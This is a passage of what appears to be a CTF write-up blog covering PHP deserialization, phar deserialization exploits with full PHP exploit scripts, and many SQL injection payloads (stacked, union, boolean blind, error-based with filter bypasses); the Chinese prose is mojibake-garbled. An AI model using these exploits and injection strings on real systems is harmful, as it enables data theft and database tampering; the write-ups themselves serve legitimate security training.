<p>å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨nicknameï¼ˆå› ä¸ºnicknameæ˜¯æœ€åä¸€ä¸ªï¼‰é‡ŒåŠ ä¸Š<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> ï¼Œ<code>&quot;;&#125;</code>åé¢çš„éƒ½ä¸ä¼šååºåˆ—åŒ–äº†ï¼Œè¿™æ ·photoå¯¹åº”çš„å€¼ä¹Ÿå°±æ˜¯config.phpäº†ã€‚</p>
<p>åœ¨update.phpé‡Œï¼Œ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>æ­£åˆ™åŒ¹é…æ§åˆ¶nicknameçš„å€¼ï¼Œç›´æ¥åˆ©ç”¨&#x3D;&#x3D;æ•°ç»„&#x3D;&#x3D;ç»•è¿‡ã€‚</p>
<p>å¦å¤–ï¼Œæˆ‘ä»¬çŸ¥é“<code>where</code>ç­‰å­—ç¬¦ä¼šè¢«<code>hacker</code>æ›¿æ¢ï¼Œä»è€Œå¢åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œè€Œ<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> é•¿34ä¸ªå­—ç¬¦ï¼Œé‚£æˆ‘ä»¬ä¼ é€’34ä¸ªwhereä½¿åé¢çš„photoé”®å€¼å¯¹é€ƒé€¸å‡ºå»ã€‚</p>
<p>payloadï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">nicknameæ”¹ä¸ºnickname[]

s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h4><p>&#x3D;&#x3D;pharååºåˆ—åŒ–&#x3D;&#x3D;</p>
<p>æ³¨å†Œåç™»å½•ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åç‚¹å‡»ä¸‹è½½ï¼ŒæŠ“åŒ…ï¼Œæ›´æ”¹filenameçš„å€¼ä¸º..&#x2F;..&#x2F;index.phpï¼ŒæˆåŠŸè¯»å–æºä»£ç ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>index.phpã€class.phpã€download.phpã€delete.phpç­‰</p>
<p>index.phpï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è°ƒç”¨äº†FileListç±»é‡Œé¢çš„Nameå’ŒSizeæ–¹æ³•ã€‚</p>
<p>ä½†æ˜¯class.phpé‡Œé¢çš„FlieListç±»æ²¡æœ‰é‚£ä¸¤ä¸ªæ–¹æ³•ï¼Œä»è€Œè§¦å‘callå‡½æ•°ï¼Œcallå‡½æ•°çš„æ„æ€æ˜¯è°ƒç”¨Fileç±»çš„å¯¹åº”æ–¹æ³•ã€‚</p>
<p>åœ¨Fileç±»é‡Œé¢æœ‰ä¸€ä¸ªcloseæ–¹æ³•ï¼Œé‡Œé¢å¯ä»¥è¯»æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å°±æ˜¯è¦æƒ³åŠæ³•è§¦å‘closeæ–¹æ³•ã€‚</p>
<p>åˆçœ‹åˆ°Userç±»é‡Œæœ‰ä¸€ä¸ªcloseæ–¹æ³•ï¼Œå¦‚æœ<code>db=new FileList()</code>å°±ä¼šè°ƒç”¨closeæ–¹æ³•äº†ã€‚</p>
<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶ä¸Šä¼ ï¼Œæ³¨æ„è¦æŠ“åŒ…æ”¹mimeï¼Œç„¶ååˆ é™¤ï¼Œåœ¨filenameå†™phar:&#x2F;&#x2F;test.jpg</p>
<hr>
<h4 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h4><p>&#x3D;&#x3D;pharååºåˆ—åŒ–&#x3D;&#x3D;</p>
<p>åœ¨file.phpæœ‰ä¸€ä¸ªæ˜æ˜¾çš„å‚æ•°fileï¼Œåº”è¯¥å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œfile&#x3D;file.phpï¼Œä¸‹è½½æºä»£ç ã€‚</p>
<p>file.php:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å»ºç«‹å¯¹è±¡</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
  <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment">//èµ‹å€¼</span>
  <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è°ƒç”¨å‡½æ•°</span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‡è¦çš„æ˜¯class.php</p>
<p>popé“¾ï¼š<br>C1e4rç±»åˆ›å»ºæ—¶ï¼Œä¼šå°†ä¼ å…¥çš„å‚æ•°æœ€ç»ˆèµ‹å€¼ç»™C1e4r-&gt;testå¹¶è¾“å‡ºã€‚</p>
<p>showç±»å°†ä¼ å…¥çš„å‚æ•°fileåœ¨<code>__toString</code>çš„æ—¶å€™å¤åˆ¶ç»™contentå¹¶è¿”å›ï¼Œ<code>__toString</code>æ–¹æ³•ç”±C1e4rç±»ä¸­çš„<code>__destruct</code>è§¦å‘ã€‚</p>
<p>Testç±»ä¸­ï¼Œ<code>__get</code>é­”æœ¯æ–¹æ³•ä¼šåœ¨è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§æ—¶è§¦å‘ï¼ŒTestç±»ä¸­ä¸å­˜åœ¨sourceå±æ€§ã€‚</p>
<p><code>C1e4r::__destruct()-&gt;Show::__toString-&gt;Test::__get()</code></p>
<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'var/www/html/f1ag.php'</span><span class="token punctuation">;</span><span class="token comment">//è¦è®¿é—®çš„æ–‡ä»¶ã€‚</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘__toString</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token comment">//æ„æˆ$c->sourceè®¿é—®Testç±»ä¸­ä¸å­˜åœ¨çš„sourceå±æ€§è§¦å‘__get</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶ä¸Šä¼ ï¼Œè®°å¾—æŠ“åŒ…æ”¹åç¼€<code>jpg</code>ï¼Œç±»å‹<code>image/jpeg</code>.</p>
<p>ç„¶åå°±æ˜¯è¦æ‰¾åˆ°æ–‡ä»¶è·¯å¾„ï¼Œç›´æ¥åœ¨urlè®¿é—®uploadï¼Œå‘ç°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åå­—ï¼Œæœ€ååœ¨file.phpé¡µé¢åˆ©ç”¨pharåè®®getä¼ å‚</p>
<p><code>file.php?file=phar://upload/3fc8a9dd0fd47215edfc0d945febf41a.jpg</code></p>
<p>base64è§£ç å¾—flag</p>
<hr>
<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h4><p>å…ˆéšä¾¿æ¥ä¸ªusername&#x3D;1,password&#x3D;1ï¼Œæç¤ºè´¦å·å¯†ç é”™è¯¯</p>
<p>æ‰“å¼€hackbarå¯¼å…¥urlï¼Œåœ¨passwordååŠ ä¸ªå•å¼•å·ï¼Œå‘ç°æŠ¥é”™ï¼Œå­˜åœ¨æ³¨å…¥æ¼æ´</p>
<p>password&#x3D;1â€™or 1&#x3D;1%23 è¿™é‡Œç”¨&#x3D;&#x3D;%23&#x3D;&#x3D;åšæ³¨é‡Šç¬¦ï¼Œå‘é€åä¹‹é—´å‡ºç°flag</p>
<hr>
<h4 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h4><p>æœ¬é¢˜ä¸º&#x3D;&#x3D;å †å æ³¨å…¥&#x3D;&#x3D;</p>
<p>1â€™;show tables;â€“+	å‘ç°ä¸¤ä¸ªè¡¨1919810931114514å’Œwords</p>
<p>1â€™;select * from 1919810931114514;â€“+	ç›´æ¥æŸ¥è¯¢ï¼Œå‘ç°select|update|delete|drop|insert|whereè¢«è¿‡æ»¤äº†</p>
<p>1â€™;show columns from <code>words</code>;â€“+	</p>
<p>1â€™;show columns from <code>1919810931114514</code>;â€“+	 çŒœæµ‹è¿™é‡Œçš„è¾“å…¥æ¡†æŸ¥è¯¢çš„æ˜¯wordsè¡¨å¯¹åº”idçš„å­—æ®µï¼Œä¸å¹¸çš„æ˜¯flagåœ¨1919810931114514è¡¨é‡Œã€‚å¯ä»¥å…ˆæŠŠwordsè¡¨æ”¹åä¸ºå…¶ä»–çš„ï¼Œç„¶åå°†1919810931114514æ”¹åä¸ºwordsï¼Œå°±å¯ä»¥æŸ¥è¯¢flagäº†ï¼</p>
<p>1â€™;rename table <code>words</code> to words2;  rename table <code>1919810931114514</code> to <code>words</code>;alter table words change flag id varchar(100);â€“+</p>
<p>ç„¶åä¸‡èƒ½å¯†ç æŸ¥è¯¢ï¼š</p>
<p>1â€™or 1&#x3D;1;â€“+</p>
<hr>
<h4 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h4><p>æœ¬é¢˜ä¸»è¦æ˜¯&#x3D;&#x3D;çŒœè§£åå°sqlæŸ¥è¯¢è¯­å¥&#x3D;&#x3D;</p>
<p>é€šè¿‡è¾“å…¥éé›¶æ•°å­—å¾—åˆ°çš„å›æ˜¾1å’Œè¾“å…¥å…¶ä½™å­—ç¬¦å¾—ä¸åˆ°å›æ˜¾æ¥åˆ¤æ–­å‡ºå†…éƒ¨çš„æŸ¥è¯¢è¯­å¥å¯èƒ½å­˜åœ¨æœ‰||ï¼Œä¹Ÿå°±æ˜¯select è¾“å…¥çš„æ•°æ®||å†…ç½®çš„ä¸€ä¸ªåˆ—å from è¡¨åï¼Œè¿›ä¸€æ­¥è¿›è¡ŒçŒœæµ‹å³ä¸ºselect postè¿›å»çš„æ•°æ®||flag from Flag(å«æœ‰æ•°æ®çš„è¡¨åï¼Œé€šè¿‡&#x3D;&#x3D;å †å æ³¨å…¥&#x3D;&#x3D;å¯çŸ¥)ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶çš„||èµ·åˆ°çš„ä½œç”¨æ˜¯orçš„ä½œç”¨</p>
<p>è§£æ³•ï¼š</p>
<p>è¾“å…¥çš„å†…å®¹ä¸º *,1<br>å†…ç½®çš„sqlè¯­å¥ä¸ºsql &#x3D; â€œselectâ€.post[â€˜queryâ€™].â€||flag from Flagâ€;<br>å¦‚æœ$post[â€˜queryâ€™]çš„æ•°æ®ä¸º *,1ï¼Œsqlè¯­å¥å°±å˜æˆäº†select *,1||flag from Flagï¼Œä¹Ÿå°±æ˜¯select *,1 from Flagï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æŸ¥è¯¢å‡ºäº†Flagè¡¨ä¸­çš„æ‰€æœ‰å†…å®¹</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h4><p>&#x3D;&#x3D;æœ‰å›æ˜¾çš„æŸ¥è¯¢&#x3D;&#x3D;</p>
<p>é¦–å…ˆç”¨username&#x3D;1,password&#x3D;1ä¸Šä¼ ï¼Œå‘ç°æ˜¯get ä¼ å‚ï¼Œæ‰“å¼€hackbar</p>
<p>?username&#x3D;1â€™or 1&#x3D;1%23&amp;password&#x3D;1	ä¸‡èƒ½å¯†ç ç™»å½•</p>
<p>?username&#x3D;1â€™order by 3%23&amp;password&#x3D;1	order by æŸ¥åˆ—ï¼Œæœ‰ä¸‰åˆ—</p>
<p>?username&#x3D;1â€™union select 1,2,3%23&amp;password&#x3D;1	æœ‰å›æ˜¾2,3</p>
<p>?username&#x3D;1â€™union select 1,2,database()%23&amp;password&#x3D;1	æŸ¥æ•°æ®åº“</p>
<p>?username&#x3D;1â€™union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€™geekâ€™)%23&amp;password&#x3D;1	æŸ¥è¡¨</p>
<p>?username&#x3D;1â€™union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;â€™l0ve1ysq1â€™)%23&amp;password&#x3D;1	æŸ¥å­—æ®µ</p>
<p>?username&#x3D;1â€™union select 1,(select group_concat(username) from l0ve1ysq1),(select group_concat(password) from l0ve1ysq1)%23&amp;password&#x3D;1	æŸ¥å€¼ï¼ˆé¡µé¢çœ‹ä¸æ¸…ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å³å¯ï¼‰</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h4><p>&#x3D;&#x3D;å¸ƒå°”ç›²æ³¨&#x3D;&#x3D;</p>
<p>é¦–å…ˆç”¨username&#x3D;1,password&#x3D;1ä¸Šä¼ ï¼Œå‘ç°æ˜¯get ä¼ å‚ï¼Œæ‰“å¼€hackbar</p>
<p>æ— æ³•ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œè¿™é‡Œç”¨	?username&#x3D;1â€™%23&amp;password&#x3D;1	ç›´æ¥å°†passwordæ³¨é‡Š</p>
<p>?username&#x3D;1â€™oorrder bbyy 3%23&amp;password&#x3D;1	orderby æŸ¥åˆ—ï¼Œè¿™é‡Œè¿‡æ»¤äº†orå’Œby,åŒå†™å³å¯ç»•è¿‡</p>
<p>ç”¨union select ä¹‹åæ²¡æœ‰å›æ˜¾ï¼Œè¿™é‡Œä½¿ç”¨bp çˆ†ç ´çš„æ–¹æ³•</p>
<p>?username&#x3D;adminâ€™anandd left((database()),1)&#x3D;â€™gâ€™%23&amp;password&#x3D;1	å¾—åˆ°æ•°æ®åº“åä¸ºgeek</p>
<p>åŒç†å¯å¾—è¡¨åb4bsqlã€geekï¼Œflagåœ¨b4bsqlé‡Œ</p>
<p>?username&#x3D;adminâ€™anandd left((selselectect passwoorrd frofromm geek.b4bsql limit 7,1),1)&#x3D;â€™fâ€™%23&amp;password&#x3D;1	çˆ†ç ´å¯å¾—flag</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h4><p>&#x3D;&#x3D;æŠ¥é”™æ³¨å…¥&#x3D;&#x3D;</p>
<p>1ï¼šç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨&#x2F;**&#x2F;æˆ–è€…()ç»•è¿‡<br>2ï¼š&#x3D;å·è¢«è¿‡æ»¤å¯ä»¥ç”¨likeæ¥ç»•è¿‡<br>3ï¼šsubstringä¸midè¢«è¿‡æ»¤å¯ä»¥ç”¨rightä¸leftæ¥ç»•è¿‡</p>
<p>é¦–å…ˆç”¨username&#x3D;1,password&#x3D;1ä¸Šä¼ ï¼Œå‘ç°æ˜¯get ä¼ å‚ï¼Œæ‰“å¼€hackbar</p>
<p>è¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨()ç»•è¿‡</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(database())),0x7e))%23&amp;password&#x3D;1	çˆ†åº“ågeek</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(â€˜geekâ€™)),0x7e),1))%23&amp;password&#x3D;1	çˆ†è¡¨åH4rDsq1</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(â€œH4rDsq1â€)),0x7e),1))%23&amp;password&#x3D;1	çˆ†å­—æ®µid,username,password</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1))%23&amp;password&#x3D;1	çˆ†flagå·¦åŠè¾¹</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(select(right(password,35))from(geek.H4rDsq1)),0x7e),1))%23&amp;password&#x3D;1	çˆ†flagå³è¾¹</p>
<p>æ‹¼æ¥å³å¯æ‹¿åˆ°flag</p>
<hr>
<h4 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h4><p>æŠ“åŒ…å‘ç°äº†ä¸€ä¸²ç¥ç§˜å­—ç¬¦MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
<p>base32è§£ç ï¼šc2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</p>
<p>base64è§£ç ï¼šselect * from user where username &#x3D; â€˜$nameâ€™</p>
<p>fuzzå‘ç°è¿‡æ»¤çš„å­—ç¬¦</p>
